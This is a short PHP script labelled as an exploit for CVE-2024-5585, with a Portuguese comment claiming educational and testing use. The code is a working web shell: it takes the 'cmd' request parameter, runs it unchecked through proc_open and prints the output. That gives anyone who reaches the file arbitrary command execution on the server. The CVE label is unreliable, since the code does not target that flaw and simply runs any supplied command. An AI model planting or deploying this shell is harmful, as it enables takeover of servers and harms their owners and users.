<?php
// CVE-2024-5585 Exploit - PHP Command Injection
// Este script é para fins educacionais e de teste apenas.

if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    $descriptors = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
    );
    $process = proc_open($command, $descriptors, $pipes);
    if (is_resource($process)) {
        $output = stream_get_contents($pipes[1]);
        fclose($pipes[1]);
        echo "<pre>$output</pre>";
        proc_close($process);
    } else {
        echo "Falha ao criar processo.";
    }
} else {
    echo "Parâmetro 'cmd' não fornecido.";
}
?>